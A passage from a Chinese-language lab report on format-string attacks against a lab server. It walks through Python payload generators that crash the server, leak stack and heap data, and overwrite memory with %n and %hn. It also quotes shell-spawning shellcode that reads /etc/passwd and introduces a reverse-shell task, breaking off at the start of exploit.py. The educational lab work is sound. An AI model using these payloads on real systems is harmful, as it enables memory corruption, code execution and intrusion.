<p>编写一个生成格式化字符串的python程序<code>task1.py</code>。运行它，使格式化字符串（750个“%s”）保存在<code>badfile1</code>中</p>
<p>（格式规定符是%s，printf()函数把获得到的值视为一个地址，并打印出该地址处的字符串。而栈帧保存的值并不都是合法的地址，它们可能是0(null指针)、）</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task1.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>s = <span class="hljs-string">&quot;%s&quot;</span>*<span class="hljs-number">750</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile1&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150434142.png" srcset="/img/loading.gif" lazyload alt="image-20211201150434142"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile1</code>的内容。可以看到服务器端没有打印出“Returned properly”和几个笑脸，故格式化程序已崩溃。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150450719.png" srcset="/img/loading.gif" lazyload alt="image-20211201150450719"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150559167.png" srcset="/img/loading.gif" lazyload alt="image-20211201150559167"></p>
</li>
</ol>
<h2 id="4-任务2：打印出服务器程序的内存">4 任务2：打印出服务器程序的内存</h2>
<p>​		此任务的目标是让服务器从其内存中打印出一些数据（我们将继续使用 10.9.0.5）。 数据会在服务器端打印出来，攻击者看不到。 因此，这不是一次有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p>
<h3 id="任务2-A：栈数据（Stack-Data）">任务2.A：栈数据（Stack Data）</h3>
<p>​		目标是打印出堆栈上的数据。得到需要多少个 %x 格式说明符才能让服务器程序打印出输入的前四个字节？ 你可以在那里放一些唯一的数字（4个字节），所以当它们被打印出来时，你可以立即知道。这个数字对于大多数后续任务都是必不可少的。</p>
<h3 id="任务2-B：堆数据（Heap-Data）">任务2.B：堆数据（Heap Data）</h3>
<p>​		堆区中存储了一个秘密消息（一个字符串），可以从服务器打印输出中找到该字符串的地址。 目标是打印出这个秘密信息。 为实现此目标，需要将秘密消息的地址（以二进制形式）放入格式字符串中。<br>
​		大多数计算机都是小端机器，因此为了在内存中存储地址 0xAABBCCDD（32 位机器上的四个字节），最低有效字节 0xDD 存储在低地址，而最高有效字节 0xAA 存储在高地址。 因此，当我们将地址存储在缓冲区中时，我们需要使用以下顺序进行保存：0xDD、0xCC、0xBB，然后是 0xAA。 在 Python 中，您可以执行以下操作：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">number = <span class="hljs-number">0xAABBCCDD</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] = (number).to_bytes(<span class="hljs-number">4</span>,byteorder=’little’)<br></code></pre></div></td></tr></table></figure>
<h3 id="实验操作-5">实验操作</h3>
<h4 id="2-A">2.A</h4>
<ol>
<li>
<p>编写一个生成字符串的python程序<code>task2A.py</code>。运行它，使字符串（0x20190806的字节形式和499个“%x|”）保存在<code>badfile2A</code>中。</p>
<p>（%x：将参数视为unsigned int类型（4字节），并用十六进制的格式打印出来。当printf()遇到%x时，它打印出va_list指针指向的数，并将va_list推进4个字节）。</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task2A.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x20190806</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%x|&quot;</span>*<span class="hljs-number">499</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile2A&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151707668.png" srcset="/img/loading.gif" lazyload alt="image-20211201151707668"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile2A</code>的内容。得到服务器打印出的内容。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150258693.png" srcset="/img/loading.gif" lazyload alt="image-20211201150258693"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150214883.png" srcset="/img/loading.gif" lazyload alt="image-20211201150214883"></p>
</li>
<li>
<p>将服务器输出中<code>20190806|</code>及之前根据<code>%x</code>打印出的字符串复制到一个文件<code>count.txt</code>中。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150352151.png" srcset="/img/loading.gif" lazyload alt="image-20211201150352151"></p>
</li>
<li>
<p>通过<code>grep</code>相关命令得到<code>|</code>的个数为64。即可以得到需要64个 %x 格式说明符才能让服务器程序打印出输入的前四个字节<code>0x20190806</code>（63个%x将va_list指针移动至输入的起始地址）。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150332057.png" srcset="/img/loading.gif" lazyload alt="image-20211201150332057"></p>
</li>
</ol>
<h4 id="2-B">2.B</h4>
<ol>
<li>
<p>根据服务器的输出<code>The secret message’s address: 0x080b4008</code>，得到秘密信息的地址为<code>0x080b4008</code>。编写一个生成字符串的python程序<code>task2B.py</code>。运行它，使字符串（由0x080b4008的字节形式，63个&quot;%x&quot;和&quot;\nsecret message:%s&quot;构成）保存在<code>badfile12AB</code>中。</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task2B.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080b4008</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;\nsecret message:%s&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile2B&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile2B</code>的内容。得到服务器打印出的内容。故秘密信息(secret message)为<code>A secret message</code></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151730211.png" srcset="/img/loading.gif" lazyload alt="image-20211201151730211"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151845038.png" srcset="/img/loading.gif" lazyload alt="image-20211201151845038"></p>
</li>
</ol>
<h2 id="5-任务3：修改服务器程序的内存">5 任务3：修改服务器程序的内存</h2>
<p>​		此任务的目标是修改服务器程序中定义的目标变量的值（我们将继续使用 10.9.0.5）。target 的原始值为 0x11223344。假设这个变量拥有一个重要的值，它会影响程序的控制流程。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。我们有三个子任务。</p>
<h3 id="任务3-A：将值更改为不同的值">任务3.A：将值更改为不同的值</h3>
<p>​		在这个子任务中，我们需要将目标变量的内容更改为其他内容。 如果您可以将其更改为不同的值，无论它可能是什么值，您的任务都被视为成功。 目标变量的地址可以从服务器打印输出中找到。</p>
<h3 id="任务3-B：将值更改为-0x5000">任务3.B：将值更改为 0x5000</h3>
<p>​		在此子任务中，我们需要将目标变量的内容更改为特定值 0x5000。只有当变量的值变为 0x5000 时，任务才被视为成功。</p>
<h3 id="任务3-C：将值更改为-0xAABBCCDD。">任务3.C：将值更改为 0xAABBCCDD。</h3>
<p>​		这个子任务与上一个类似，只是目标值现在是一个很大的数字。在格式字符串攻击中，该值是 <code>printf()</code> 函数打印出的字符总数； 打印出如此大量的字符可能需要几个小时。 您需要使用更快的方法。 基本思想是使用<code>%hn</code>或<code>%hhn</code>，而不是<code>%n</code>，这样我们就可以修改一个两字节（或一字节）的内存空间，而不是四个字节。 打印出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>16</mn></msup></mrow><annotation encoding="application/x-tex">2^{16}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">16</span></span></span></span></span></span></span></span></span></span></span></span>个字符不需要太多时间。</p>
<h3 id="实验操作-6">实验操作</h3>
<h4 id="3-A">3.A</h4>
<ol>
<li>
<p>根据服务器的输出<code>The target variable’s address: 0x080e5068</code>，得到目标变量（<code>target variable</code>）的地址为<code>0x080e5068</code>。编写一个生成字符串的python程序<code>task3A.py</code>。运行它，使字符串（0x080e5068的字节形式、63个&quot;.%x&quot;、1个&quot;%n&quot;、结尾&quot;\n&quot;）保存在<code>badfile3A</code>中。<br>
（当printf()遇到%n时，它会获取va_list指针指向的值，将视该值为一个内存地址，然后将数据（已打印出的字符的个数）写入该地址）。</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3A.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;.%x&quot;</span>*<span class="hljs-number">63</span>+<span class="hljs-string">&quot;%n\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3A&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154021212.png" srcset="/img/loading.gif" lazyload alt="image-20211201154021212"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3A</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0x00000012b</code>。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154405920.png" srcset="/img/loading.gif" lazyload alt="image-20211201154405920"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201155539801.png" srcset="/img/loading.gif" lazyload alt="image-20211201155539801"></p>
</li>
</ol>
<h4 id="3-B">3.B</h4>
<ol>
<li>
<p><code>0x5000=20480=4+62*325+326</code>，故编写一个生成字符串（0x080e5068的字节形式（长度为4个字符）、62个&quot;%.325x&quot;、1个&quot;%.326x&quot;、1个&quot;%n&quot;、结尾&quot;\n&quot;）的python程序<code>task3B.py</code>。运行它，使该字符串保存在<code>badfile3B</code>中。</p>
<p>（精度修饰符形如”.number“，当应用于整型值时，它控制最少打印多少位字符）</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3B.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>s = <span class="hljs-string">&quot;%.325x&quot;</span>*<span class="hljs-number">62</span>+<span class="hljs-string">&quot;%.326x&quot;</span>+<span class="hljs-string">&quot;%n\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">4</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3B&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162008447.png" srcset="/img/loading.gif" lazyload alt="image-20211201162008447"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3B</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0x00005000</code>。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162034070.png" srcset="/img/loading.gif" lazyload alt="image-20211201162034070"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161817247.png" srcset="/img/loading.gif" lazyload alt="image-20211201161817247"></p>
<p>中间省略…</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161838430.png" srcset="/img/loading.gif" lazyload alt="image-20211201161838430"></p>
</li>
</ol>
<h4 id="3-C">3.C</h4>
<ol>
<li>
<p>因为0xAA=170&lt;4*64，故选用%hn（视参数视为2字节字符型数），即每次只修改两个字节的值。根据小端法，目标变量（<code>target variable</code>）从最高两位字节的地址为<code>0x080e506a</code>、最低两位字节的地址为<code>0x080e5068</code>。</p>
<p>故字符串开头为数字0x080e506a+“@@@@”+数字0x080e5068。共12个字符。</p>
<p>（printf()通过格式化字符%x经过&quot;@@@@&quot;才能改变%n对应数据——已打印出的字符的个数，给下一个地址赋更大的值）</p>
<ul>
<li>0xAABB=43707，43707=12+693*62+729</li>
<li>0xCCDD-0xAABB=8738。</li>
</ul>
<p>故字符串由0x080e506a的字节形式、“@@@@”、0x080e5068的字节形式、62个&quot;%.693x&quot;、1个&quot;%.729x&quot;、1个&quot;%hn&quot;、1个&quot;%.8738x&quot;、1个&quot;%hn&quot;、结尾&quot;\n&quot;组成。</p>
<p>编写一个生成该字符串的python程序<code>task3C.py</code>。运行它，使该字符串保存在<code>badfile3C</code>中。</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task3C.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment">#AA 0x080e506b</span><br><span class="hljs-comment">#BB 0x080e506a</span><br><span class="hljs-comment">#CC 0x080e5069</span><br><span class="hljs-comment">#DD 0x080e5068</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br>number  = <span class="hljs-number">0x080e506a</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;@@@@&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>number  = <span class="hljs-number">0x080e5068</span><br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (number).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>s=<span class="hljs-string">&quot;%.693x&quot;</span>*<span class="hljs-number">62</span>+<span class="hljs-string">&quot;%.729x&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span>+<span class="hljs-string">&quot;%.8738x&quot;</span>+<span class="hljs-string">&quot;%hn\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile3C&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171027112.png" srcset="/img/loading.gif" lazyload alt="image-20211201171027112"></p>
</li>
<li>
<p>向服务器server-10.9.0.5提供输入，输入为<code>badfile3C</code>的内容。得到服务器打印出的内容。得到目标变量（<code>target variable</code>）的值变为<code>0xaabbccdd</code>。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171129393.png" srcset="/img/loading.gif" lazyload alt="image-20211201171129393"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171214123.png" srcset="/img/loading.gif" lazyload alt="image-20211201171214123"></p>
<p>中间省略…</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171233679.png" srcset="/img/loading.gif" lazyload alt="image-20211201171233679"></p>
</li>
</ol>
<h2 id="6-任务4：将恶意代码注入服务器程序">6 任务4：将恶意代码注入服务器程序</h2>
<p>​		现在我们已经准备好追逐这次攻击的皇冠上的明珠——代码注入。 我们想将一段二进制格式的恶意代码注入服务器的内存中，然后利用格式化字符串漏洞修改函数的返回地址字段，因此当函数返回时，它会跳转到我们注入的代码。<br>
​		用于此任务的技术与前一任务中的技术类似：它们都修改内存中的4字节数字。前一个任务修改目标变量，而这个任务修改函数的返回地址字段。我们需要根据服务器打印出来的信息，计算返回地址字段的地址。</p>
<h3 id="6-1-了解栈的布局">6.1 了解栈的布局</h3>
<p>​		要成功完成此任务，必须了解在myprintf() 中调用 printf() 函数时的堆栈布局。 图1描述了堆栈布局。 需要注意的是，我们故意在 main 和 myprintf 函数之间放置了一个虚拟栈帧，但是图中没有显示。</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201194243554.png" srcset="/img/loading.gif" lazyload alt="image-20211201194243554"></p>
<p>在完成这项任务之前，需要回答以下问题：</p>
<p>问题 1： ②和 ③ 标记的位置的内存地址是什么？</p>
<p>得到：</p>
<ul>
<li>②：myprintf()的返回地址存储的地址。</li>
<li>③：用户输入的起始地址。</li>
</ul>
<p>问题2：我们需要多少个 %x 格式说明符才能将格式字符串参数指针移动到 ③？ 记住，参数指针从①上面的位置开始。</p>
<ul>
<li>根据任务2.A可以得到，我们需要63个 %x 格式说明符才能将格式字符串参数指针移动到 ③。</li>
</ul>
<h3 id="6-2-shellcode">6.2 shellcode</h3>
<p>​		Shellcode 通常用于代码注入攻击。 它基本上是一段启动 shell 的代码，通常用汇编语言编写。 本实验仅提供一个通用Shellcode的二进制版本。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">shellcode = (<br>&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;<br>&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;<br>&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;<br>&quot;/bin/bash*&quot; ①<br>&quot;-c*&quot; ②<br>&quot;/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd *&quot; ③<br><span class="hljs-meta prompt_"># </span><span class="language-bash">The * <span class="hljs-keyword">in</span> this line serves as the position marker *</span><br>&quot;AAAA&quot; # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;<br>&quot;BBBB&quot; # Placeholder for argv[1] --&gt; &quot;-c&quot;<br>&quot;CCCC&quot; # Placeholder for argv[2] --&gt; the command string<br>&quot;DDDD&quot; # Placeholder for argv[3] --&gt; NULL<br>).encode(’latin-1’)<br></code></pre></div></td></tr></table></figure>
<p>​		shellcode 运行<code>“/bin/bash”</code>shell 程序（行①），但它被赋予两个参数，<code>“-c”</code>（行②）和一个命令字符串（行③）。 这表明 shell 程序将运行第二个参数中的命令。 这些字符串末尾的*只是一个占位符，在shellcode执行过程中会被一字节的0x00替换。 每个字符串的末尾都需要有一个零，但我们不能在 shellcode 中放置零。因此，我们在每个字符串的末尾放置一个占位符，然后在执行期间动态地在占位符中放置一个零。<br>
​		如果我们想让shellcode运行一些其他的命令，我们只需要修改行③中的命令字符串。但是，在进行更改时，我们需要确保不要更改此字符串的长度，因为 argv[] 数组的占位符的起始位置，就在命令字符串之后，是硬编码在Shellcode的代码。 如果我们改变长度，我们需要修改二进制部分。可以添加或删除空格将字符串末尾的星号保持在相同位置。</p>
<p>​		32位和64位版本的shellcode都包含在<code>attack-code</code>文件夹内的<code>exploit.py</code>中。 您可以使用它们来构建格式字符串。</p>
<h3 id="6-3-具体任务">6.3 具体任务</h3>
<p>​		请构建输入，将其提供给服务器程序，并证明可以成功地让服务器运行您的 shellcode。<br>
​		请在图上标记您的恶意代码的存储位置。</p>
<p>​		<img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202095518910.png" srcset="/img/loading.gif" lazyload alt="image-20211202095518910"></p>
<h4 id="获得反向shell">获得反向shell</h4>
<p>​		我们对运行一些预先确定的命令不感兴趣。 我们想要在目标服务器上获得一个 root shell，所以我们可以输入我们想要的任何命令。 由于我们在远程机器上，如果我们只是让服务器运行/bin/bash，我们将无法控制shell程序。</p>
<p>​		反向shell是解决这个问题的典型技术。 实验说明的第 9 节提供了有关如何运行反向 shell 的详细说明。 请修改shellcode中的命令字符串，以便可以在目标服务器上获得一个反向shell。</p>
<h3 id="实验操作-7">实验操作</h3>
<ol>
<li>
<p>这里我准备将shellcode放在输入的尾部。使用<code>%.numberx</code>移动<code>va_list</code>指针并修改已打印字符的值，<code>.number</code>为精度修饰符。然后选用<code>%hn</code>，单次修改2个字节，将myprint的返回地址修改为shellcode的入口地址。补全后的python程序<code>exploit.py</code>及相关注释如下：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 